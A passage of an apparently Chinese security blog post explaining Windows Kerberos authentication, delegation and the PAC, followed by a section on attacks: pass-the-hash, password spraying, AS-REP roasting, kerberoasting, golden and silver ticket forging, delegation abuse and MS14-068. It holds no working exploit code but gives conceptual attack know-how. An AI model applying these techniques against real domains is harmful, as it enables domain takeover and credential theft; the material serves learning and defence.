Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p><p>成功后，<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p><p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p><p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p><p><img src="https://techdocs.broadcom.com/content/dam/broadcom/techdocs/us/en/assets/docops/casso128/kerberos_environment.png"></p><h2 id="较详简述"><a href="#较详简述" class="headerlink" title="较详简述"></a>较详简述</h2><ol><li><p><strong>AS_REQ</strong>: <code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是<code>Client hash</code>加密的时间戳</p></li><li><p><strong>AS_REP</strong>: <code>KDC</code>使用<code>Client hash</code>进行解密，如果结果正确就返回用<code>krbtgt hash</code>加密的<code>TGT</code>票据，<code>TGT</code>里面包含<code>PAC</code>，<code>PAC</code>包含<code>用户Client</code>的<code>sid</code>和<code>用户Client</code>所在的<code>组</code>。</p></li><li><p><strong>TGS_REQ</strong>: <code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>发起针对特定<code>Server</code>的<code>TGS_REQ</code>请求</p></li><li><p><strong>TGS_REP</strong>: <code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]（这一步不管用户有没有访问<code>Server</code>的权限，只要<code>TGT</code>正确，就返回<code>TGS</code>票据 [<code>Ticket</code>]）</p></li><li><p><strong>AP_REQ</strong>: <code>Client</code>拿着<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></p></li><li><p><strong>AP_REP</strong>: <code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限。</p></li></ol><h1 id="域认证详细流程"><a href="#域认证详细流程" class="headerlink" title="域认证详细流程"></a>域认证详细流程</h1><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. pvno</span><br><span class="line">kerberos 版本号</span><br><span class="line"><span class="number">2</span>. msg<span class="literal">-type</span></span><br><span class="line">类型，AS_REQ对应的就是KRB_AS_REQ(<span class="number">0</span>x0a)</span><br><span class="line"><span class="number">3</span>. PA_DATA</span><br><span class="line">主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有<span class="built_in">type</span>和value。</span><br><span class="line"><span class="number">4</span>. REQ_BODY</span><br><span class="line">kdc<span class="literal">-options</span> 一些flag 字段</span><br></pre></td></tr></table></figure><h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. msg<span class="literal">-type</span></span><br><span class="line">AS_REQ的响应body对应的就是KRB_AS_REP(<span class="number">0</span>x0b)</span><br><span class="line"><span class="number">2</span>. crealm</span><br><span class="line">域名</span><br><span class="line"><span class="number">3</span>. cname</span><br><span class="line">用户名</span><br><span class="line"><span class="number">4</span>. ticket</span><br><span class="line">这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。详情见相关的安全问题&gt;黄金票据.</span><br><span class="line"><span class="number">5</span>. enc_part</span><br><span class="line">这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。</span><br></pre></td></tr></table></figure><h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. msg<span class="literal">-type</span></span><br><span class="line">类型，TGS_REQ对应的就是KRB_TGS_REQ(<span class="number">0</span>x0c)</span><br><span class="line"><span class="number">2</span>. PA<span class="literal">-DATA</span></span><br><span class="line">正常的TGS_REQ的请求需要用到有</span><br><span class="line">AP_REQ：这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。KDC校验TGT票据，如果票据正确，就返回TGS票据。</span><br><span class="line">PA_FOR_USER：类型是S4U2SELF,值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</span><br><span class="line">PA_PAC_OPTIONS：值是以下flag的组合Claims(<span class="number">0</span>)、Branch Aware(<span class="number">1</span>)、Forward to Full DC(<span class="number">2</span>)、Resource<span class="literal">-based</span> Constrained Delegation (<span class="number">3</span>)。微软的MS<span class="literal">-SFU</span> <span class="number">2.2</span>.<span class="number">5</span>，S4U2proxy 必须扩展PA<span class="literal">-PAC</span><span class="literal">-OPTIONS</span>结构。</span><br><span class="line">如果是基于资源的约束委派，就需要指定Resource<span class="literal">-based</span> Constrained Delegation位。</span><br><span class="line"><span class="number">3</span>. REQ_BODY</span><br><span class="line">sname：这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</span><br><span class="line">AddtionTicket：附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</span><br></pre></td></tr></table></figure><h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. msg<span class="literal">-type</span></span><br><span class="line">AS_REQ的响应body对应的就是KRB_TGS_REQ(<span class="number">0</span>x0d)</span><br><span class="line"><span class="number">2</span>. ticket</span><br><span class="line">这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。详情见相关的安全问题&gt;白银票据.正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash,详情见相关的安全问题&gt;kerberoasting。</span><br><span class="line"><span class="number">3</span>. enc_part</span><br><span class="line">注意，这个enc_part不是ticket里面的enc_part，部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</span><br></pre></td></tr></table></figure><h3 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h3><blockquote><p>s4u2self的过程如下图所示(前提条件是服务已经有通过KDC验证的TGT)</p><p>S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</p></blockquote><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-SFU/ms-sfu_files/image004.png"></p><h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><blockquote><p>s4u2proxy的过程如下图所示</p><p>s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。</p></blockquote><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-SFU/ms-sfu_files/image006.png"></p><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><blockquote><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。</p><p><strong>需要注意的一点是接受委派的用户只能是<code>服务账户</code>或者<code>计算机用户</code>。</strong></p></blockquote><h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>例子：</p><p>服务(如<code>JACKSON-PC$</code>) 被配置了非约束的委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求其他所有服务。在协议层面的实现就是，某个用户委托<code>JACKSON-PC$</code>去访问某个服务，那么这个用户会将<code> TGT（在TGS里面）</code>发送到<code>JACKSON-PC$</code>并缓存到<code>LSASS</code>中，以方便以后使用。 然后<code>JACKSON-PC$</code>模拟用户去请求某个服务。</p><p><strong>配置了非约束委派的用户的<code>userAccountControl</code> 属性有个<code>FLAG</code>位 <code>TrustedForDelegation</code></strong></p><p>关于userAccountControl 每一位对应的意义可以看<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,(我们在LDAP篇也会详细介绍)，其中 TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。</p><h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><p>微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了”约束”委派。</p><p>其中包括一组 <code>Kerberos 协议扩展</code>，就是本文之前提到的两个扩展 <code>S4U2Self</code> 和 <code>S4U2Proxy</code>。配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要<code>SeEnableDelegation</code>特权（该特权很敏感，通常仅授予域管理员）才能为服务配置域帐户，并且将帐户限制为单个域。</p><p>例子：</p><p>计算机用户(即<code>JACKSON-PC$</code>) 被配置了约束的委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求特定的服务。具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的<code>kerberos服务票据(S4U2SELF)</code>，拿着这个票据向<code>KDC</code>请求访问特定服务的可转发的<code>TGS(S4U2PROXY)</code>，并且代表用户访问特定服务，而且只能访问该特定服务。</p><p>相较于非约束委派，约束委派最大的区别也就是配置的时候选择<strong>某个特定的服务</strong>，而不是所有服务。</p><p><strong>配置了约束委派的用户的userAccountControl 属性有个FLAG位 TrustedToAuthForDelegation 。</strong></p><p>关于userAccountControl 每一位对应的意义可以看<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,其中 TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 16777216 。</p><h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h4><p>为了配置受约束的委派，必须拥有<code>SeEnableDelegation</code>特权（该特权很敏感，通常仅授予域管理员）。为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p><p><strong>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</strong></p><p>这种约束委派的风格与传统约束委派非常相似，但配置相反。</p><p>传统约束委派在<code>msDS-AllowedToDelegateTo</code>属性中的帐户<code>A</code>上配置，并定义从<code>A</code>到<code>B</code>的“传出”信任。</p><p>基于资源的约束委派在<code>S-AllowedToActOnBehalfOfOtherIdentity</code>属性中的帐户<code>B</code>上配置，并定义从<code>A</code>到<code>B</code>的“传入”信任。</p><p><img src="https://p5.ssl.qhimg.com/t01fe78dcd0b3af3aa4.jpg"></p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><blockquote><p>微软为了访问控制而引进的一个扩展<code>PAC</code>，<code>PAC</code>在历史上出现过的一个严重的，允许普通用户提升到域管的漏洞<code>MS14068</code>。</p></blockquote><h3 id="引进PAC之后的kerberos流程"><a href="#引进PAC之后的kerberos流程" class="headerlink" title="引进PAC之后的kerberos流程"></a>引进<code>PAC</code>之后的<code>kerberos</code>流程</h3><ol><li>用户向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是用户<code>hash</code>加密的时间戳，<code>KDC</code>使用<code>用户hash</code>进行解密，如果结果正确返回用<code>krbtgt hash</code>加密的<code>TGT票据</code>，<code>TGT</code><strong>里面包含</strong><code>PAC</code>，<code>PAC</code>中包含<code>用户的sid</code>、<code>用户所在的组</code>。</li></ol><p><img src="https://p3.ssl.qhimg.com/t011f9cbcb54713d1b6.png"></p><ol start="2"><li><p>用户凭借<code>TGT</code>向<code>KDC</code>发起针对特定服务的<code>TGS_REQ</code>请求，<code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>服务hash</code>加密的<code>ST\Ticket</code>(这一步不管用户有没有访问服务的权限，只要<code>TGT</code>正确，就返回<code>ST\Ticket</code>，<strong>这也是</strong><code>kerberoating</code><strong>能利用的原因</strong>：任何一个用户，只要<code>hash</code>正确，就可以请求域内任何一个服务的<code>ST\Ticket</code>，具体内容可以参考<a href="https://www.anquanke.com/post/id/190625">Windows内网协议学习Kerberos篇之TGSREQ&amp; TGSREP</a>)</p></li><li><p>用户拿着<code>ST\Ticket</code>去请求服务，服务使用自己的<code>hash</code>解密<code>ST\Ticket</code>。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边询问用户有没有访问权限，<strong>域控解密</strong><code>PAC</code>。获取<code>用户的sid</code>、<code>用户所在的组</code>，再判断用户是否有访问服务的权限，有访问权限就允许用户访问（有用户<code>hash</code>，可以制作<code>ST\Ticket</code>，但是不能制作<code>PAC</code>，<code>PAC</code>自然也验证不成功，但是有些服务不去验证<code>PAC</code>，这是<strong>白银票据</strong>成功的前提）。</p></li></ol><p><strong>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</strong></p><h1 id="相关的安全问题"><a href="#相关的安全问题" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h1><h2 id="AS-REQ-amp-AS-REP-1"><a href="#AS-REQ-amp-AS-REP-1" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="PTH-PTK"><a href="#PTH-PTK" class="headerlink" title="PTH\ PTK"></a>PTH\ PTK</h3><blockquote><p>连接配置的时候允许使用hash进行认证，不是只有账号密码才能认证。</p></blockquote><p><img src="https://p5.ssl.qhimg.com/t01af29156e1e95022b.png"></p><p>由于在进行认证的时候，是使用<code>用户hash</code>加密时间戳，所以在使用密码进行登录的情况下，也是先把密码加密成<code>hash</code>后再进行认证。</p><p>因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。</p><p>不管是<code>rubeus</code>还是<code>impacket</code>里面的相关脚本都是支持直接使用<code>hash</code>进行认证。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果 hash 是 ntlm hash ，然后加密方式是 rc4 ，这种就算做是 pass the hash</span><br><span class="line">如果 hash 是 aes key(使用sekurlsa::ekeys导出来) ，就算是 pass the key</span><br></pre></td></tr></table></figure><p>在很多地方，不支持<code>rc4加密</code>方式的时候，使用<code>pass the key</code>不失为一种好方法。</p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><blockquote><p>域内没有域账号的情况下进行用户名枚举<br>有域账号的情况的下可以直接通过LDAP查询（域机器提到System权限后，其机器账号也是域账号）</p></blockquote><p>进行AS_REQ时，<code>用户名存在但密码错误</code>与<code>用户名不存在</code>的相应包有不同，通过这个比较就可以写脚本改变cname的值进行用户名枚举（<a href="https://daiker.gitbook.io/windows-protocol/kerberos/1#2.-yong-hu-ming-mei-ju%EF%BC%89%E3%80%82">https://daiker.gitbook.io/windows-protocol/kerberos/1#2.-yong-hu-ming-mei-ju）。</a></p><h3 id="Password-Spraying-密码喷洒"><a href="#Password-Spraying-密码喷洒" class="headerlink" title="Password Spraying(密码喷洒)"></a>Password Spraying(密码喷洒)</h3><blockquote><p>在已有用户名的时候，可以尝试爆破密码。</p></blockquote><p>进行AS_REQ时，<code>用户名存在且密码正确</code>与<code>用户名存在但密码错误</code>的相应包有不同。</p><p>实战中，都会使用“密码喷洒（Password Spraying）”的技术来进行测试和攻击。因为针对同一个用户的连续密码猜测会导致帐户被锁定，所以只有对所有用户同时指定唯一的密码去登录尝试，消除帐户被锁定的概率从而增加破解成功率。</p><h3 id="AS-REPRoasting（用户明文口令爆破）"><a href="#AS-REPRoasting（用户明文口令爆破）" class="headerlink" title="AS-REPRoasting（用户明文口令爆破）"></a>AS-REPRoasting（用户明文口令爆破）</h3><blockquote><p>对于域用户，设置了选项<code>Do not require Kerberos preauthentication(不要求Kerberos预身份验证)</code></p></blockquote><p><img src="https://p3.ssl.qhimg.com/t01618262dcc542af40.png"></p><p>此时向域控制器的<code>88</code>端口发送<code>AS_REQ</code>请求，对收到的AS_REP内容重新组合（<code>enc-part</code>底下的<code>ciper</code>，因为这部分是使用<code>用户hash</code>加密<code>session-key</code>，我们通过进行离线爆破就可以获得<code>用户hash</code>），能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，可以使用hashcat对其破解，最终获得该用户的明文口令。</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><blockquote><p><code>AS</code>确认<code>Client</code>端登录者用户身份，通过伪造的<code>TGT</code>，可以获取任意<code>Kerberos</code>的访问权限，由<code>krbtgt NTLM Hash</code>加密。</p></blockquote><h4 id="伪造条件"><a href="#伪造条件" class="headerlink" title="伪造条件"></a>伪造条件</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称</span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账号的HASH（意味着你已经有域控制器权限了)</span><br><span class="line"><span class="number">4</span>、伪造任意用户名,可以是任意的</span><br></pre></td></tr></table></figure><p>在<code>Kerberos</code>认证中，<code>Client</code>通过<code>AS(Authentication Service)</code>认证后，<code>AS</code>会给<code>Client</code>一个<br><code>Logon Session Key</code>和<code>TGT</code>，而<code>Logon Session Key</code>并不会保存在<code>KDC</code>中，<code>krbtgt</code>的<code>NTLM Hash</code>又是固定的(此账户一般不会改密码)，所以只要得到<code>krbtgt</code>的<code>NTLM Hash</code>，就可以伪造<code>TGT</code>和<code>Logon Session Key</code>来进入下一步<code>Client</code>与<code>TGS</code>的交互。</p><p>有了金票后，就可以跳过<code>AS</code>验证，直接同<code>KDC</code>交互，不用验证账户和密码，所以也不用担心域管密码被修改。</p><h2 id="TGS-REQ-amp-TGS-REP-1"><a href="#TGS-REQ-amp-TGS-REP-1" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="PTT-pass-the-ticket"><a href="#PTT-pass-the-ticket" class="headerlink" title="PTT(pass the ticket)"></a>PTT(pass the ticket)</h3><blockquote><p><code>Kerbreos</code> 除了第一步<code>AS_ERQ</code>是使用 时间戳 加密<code>用户hash</code>验证之外，其他的步骤的验证都是通过<code>票据</code>，这个票据可以是<code>TGT(Ticket Granting Ticket)</code>或者<code>TGS票据(Server Ticket/Ticket)</code>。因为票据里面的内容主要是<code>session_key</code>和<code>ticket(使用服务hash加密的，服务包括krbtgt)</code>，拿到票据之后，我们就可以用这个票据来作为下阶段的验证了。</p></blockquote><h3 id="kerberosting（服务hash爆破）"><a href="#kerberosting（服务hash爆破）" class="headerlink" title="kerberosting（服务hash爆破）"></a>kerberosting（服务hash爆破）</h3><blockquote><p>因为<code>TGS_REP</code>里面<code>ticket</code>里的<code>enc_part(是ticket里面的enc_part,不是最外层的enc_part,最外层的enc_part是使用AS_REP里面的session_key加密的，这个session_key我们已经有了，没有意义)</code>，是使用要请求的<code>服务的hash</code>加密的，所以我们可以通过爆破获得<code>服务的hash</code>。</p></blockquote><p><img src="https://p3.ssl.qhimg.com/t01642709fde6925df7.png"></p><p>这个问题存在的另外一个因素是因为用户向<code>KDC</code>发起<code>TGS_REQ</code>请求，不管用户对服务有没有访问权限，只要<code>TGT</code>正确，那么肯定会返回<code>TGS</code>。</p><p>其实<code>AS_REQ</code>里面的服务就是<code>krbtgt</code>，也就是说这个同样用于爆破<code>AS_REP</code>里面的<code>ticket</code>部分的<code>encpart</code>得到<code>krbtgt的hash</code>，但网上没出现这种攻击方式是因为<code>krbtgt</code>的密码是随机生成的，我们也跑不出来.</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><blockquote><p><code>Client</code>向<code>Server</code>发送服务请求，通过伪造的<code>Ticket</code>，只能访问指定的服务，如<code>cifs、http、mssql等</code>，由服务账号<code>NTLM Hash</code>加密。</p></blockquote><h4 id="伪造条件-1"><a href="#伪造条件-1" class="headerlink" title="伪造条件"></a>伪造条件</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称</span><br><span class="line"><span class="number">2</span>、域SID</span><br><span class="line"><span class="number">3</span>、目标服务器的FQDN（Fully Qualified Domain Name全限定域名，即同时带有主机名和域名的名称。）</span><br><span class="line"><span class="number">4</span>、可利用的服务（运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等）</span><br><span class="line"><span class="number">5</span>、服务账号的NTLM Hash（如果是域控制器，那就代表DC已经被拿下了）</span><br><span class="line"><span class="number">6</span>、需要伪造的用户名,可以是任意的</span><br></pre></td></tr></table></figure><p>在<code>Kerberos</code>认证中的第⑤-⑥步，<code>Client</code>带着<code>Ticket</code>和<code>Authenticator3</code>向<code>Server</code>上的某个服务进行请求，<code>Server</code>接收到<code>Client</code>的请求之后，通过自己的<code>Master Key</code>解密<code>Ticket</code>，从而获得<code>Session Key</code>。通过<code>Session Key</code>解密<code>Authenticator3</code>，进而验证对方的身份，验证成功就允许<code>Client</code>访问<code>Server</code>上的指定服务了。</p><p>所以我们只需要知道<code>Server</code>用户的<code>Hash</code>就可以伪造出一个<code>Ticket</code>，<strong>且不会经过</strong><code>KDC</code>，但是伪造的<code>Ticket</code>只对部分服务起作用（已经在<code>TGT</code>的<code>PAC</code>里，通过<code>SID</code>的值限定了给<code>Client</code>授权的服务）。</p><h3 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h3><blockquote><p>如果我们找到配置了 <strong>非约束的委派的账户</strong>，比如<code>JACKSON-PC$</code>，并且通过一定手段<strong>拿下该账户的权限</strong>，然后诱导<strong>域管</strong>访问该<code>JACKSON-PC$</code>，这个时候<strong>域管</strong>会将自己<code>TGT</code>发送到<code>JACKSON-PC$</code>并缓存到<code>LSASS</code>中，那我们就可以从<code>LSASS</code>中导出<code>域管的TGT票据</code>，然后通过<code>PTT</code>，从而拥有域管的权限。</p></blockquote><h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><blockquote><p>如果我们找到配置了 <strong>约束委派的服务账号</strong>，比如<code>JACKSON-PC$</code>，并且通过一定手段<strong>拿下该账号所在的机子</strong>。我们就可以利用这个<strong>服务账号</strong>代表<strong>任意用户</strong> (重点：<strong>服务</strong>代表用户获得<strong>针对服务自身</strong>的<code>kerberos票据</code>这个过程，<strong>服务不需要用户凭据</strong>) 进行<code>s4u2self</code>获得一个<code>可转发的票据</code>，然后把获取到的<code>票据</code>用于<code>s4u2proxy(作为AddtionTicket)</code>，从而获取一个<code>可转发的TGS</code>，<strong>服务</strong>就可以<strong>代替任意用户</strong>访问<strong>另外一个服务</strong>(既<strong>被配置的约束委派的服务</strong>：<code>cifs/WIN-JQO4OSMOGK2.JMU.com</code>）。</p></blockquote><p>相较于非约束的委派，<strong>约束的委派</strong>并<strong>不需要用户过来访问</strong>就可以<strong>代表该用户</strong>，但是<strong>只能访问特定的服务</strong>，不像非约束的委派哪个可以访问任意服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对于 HOST SPN，可以实现完全的远程接管。</span><br><span class="line">对于 MSSQLSvc SPN，可以拿到 DBA 权限。 </span><br><span class="line">对于 CIFS SPN 可以实现完全的远程文件访问。</span><br><span class="line">对于 HTTP SPN 则可能实现接管远程网络服务。</span><br><span class="line">对于 LDAP 则可以执行 DCSync。</span><br><span class="line">对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限</span><br></pre></td></tr></table></figure><h3 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h3><blockquote><p>基于资源的约束委派<strong>具有传统的约束委派的所有安全问题</strong>，但是相较于传统的约束委派。基于资源的约束委派的<strong>利用又相对较为简单</strong>。</p></blockquote><p>主要体现为，<strong>普通的约束委派</strong>的配置需要SeEnableDelegation权限，而这个权限通常仅授予<code>Domain Admins</code>。因此我们对普通的约束委派的利用，往往在于<strong>寻找域内已有的约束委派，再利用</strong>。</p><p>但是对于<strong>基于资源的约束委派</strong>，假如我们<strong>已经拥有服务账号1</strong>，那么<strong>只要具备用户2的LDAP权限</strong>，这样就可以<strong>配置服务1对服务2的约束委派</strong>(在<strong>服务账户2的用户属性</strong>上配置<code>S-AllowedToActOnBehalfOfOtherIdentity</code>为<code>1</code>的<code>sid</code>)，<strong>服务1就可以控制服务2</strong>。</p><h2 id="PAC-1"><a href="#PAC-1" class="headerlink" title="PAC"></a>PAC</h2><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><blockquote><p>补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。</p></blockquote><p>该漏洞最本质的地方在于<code>Microsoft Windows Kerberos KDC</code>无法正确检查<code>Kerberos票证</code>请求随附的<code>特权属性证书（PAC）</code>中的有效签名，这里面的签名就是上面提到的<code>服务检验和</code>和<code>KDC校验和</code>。导致用户可以自己构造一张<code>PAC</code>。 签名原本的设计是要用到<code>HMAC</code>系列的<code>checksum</code>算法，也就是必须要有<code>key</code>的参与，我们没有<code>krbtgt的hash</code>以及<code>服务的hash</code>，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的<code>checksum</code>算法都可以，包括<code>MD5</code>。那我们只需要把<code>PAC</code>进行<code>md5</code>，就生成新的校验和。这也就意味着我们可以随意更改<code>PAC</code>的内容，完了之后再用<code>md5</code>给他生成一个<code>服务检验和</code>以及<code>KDC校验和</code>。在<code>MS14-068</code>修补程序之后，<code>Microsoft</code>添加了一个附加的验证步骤，以确保校验和类型为<code>KRB_CHECKSUM_HMAC_MD5</code>。</p><p><a href="https://daiker.gitbook.io/windows-protocol/kerberos/3#0x03-xiang-guan-an-quan-wen-ti">https://daiker.gitbook.io/windows-protocol/kerberos/3#0x03-xiang-guan-an-quan-wen-ti</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a 